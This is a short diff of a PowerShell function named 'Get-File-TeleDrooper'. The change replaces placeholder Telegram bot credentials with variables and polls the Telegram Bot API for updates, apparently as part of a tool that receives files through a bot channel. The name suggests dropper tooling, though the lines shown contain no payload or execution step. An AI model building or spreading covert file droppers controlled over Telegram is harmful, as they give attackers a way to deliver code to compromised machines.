@@ -30,8 +30,8 @@ Function Get-File-TeleDrooper{
   Write-Output "BOT ID: $BId || BOT TOKEN: BToken"
 
 
-  $MyToken = "YOUR TOKEN HERE"
-  $ChatID = 123456789
+  $MyToken = $BToken
+  $ChatID = $BId
   $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
   #Convert the result from json and put them in an array
   $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result
